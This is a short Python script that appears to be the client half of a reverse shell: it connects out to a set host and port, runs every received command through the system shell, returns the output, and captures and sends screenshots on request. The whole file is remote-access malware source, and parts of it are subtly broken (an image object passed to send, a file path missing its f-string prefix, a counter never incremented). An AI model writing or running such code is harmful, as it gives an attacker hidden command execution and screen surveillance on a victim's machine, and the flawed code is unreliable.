import socket
import subprocess
import os
from PIL import ImageGrab


count = 0


def screenshot():
    shot = ImageGrab.grab()
    shot.save(f'screenshot{count}.png')
    client.send(shot)
    shot.close()
    os.remove('screenshot{count}.png')

remote_host = '127.0.0.1'
port = 8080

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((remote_host, port))

while True:
    comm = client.recv(1024).decode()
    if not comm:
        break
    elif comm == 'screenshot':
        screenshot()
    else:
        try:
            output = subprocess.check_output(comm, stderr=subprocess.STDOUT, text=True, shell=True)
            client.send(output.encode())
        except subprocess.CalledProcessError as e:
            msg = f'\nerror: {e}'
            client.send(msg.encode())

client.close()     
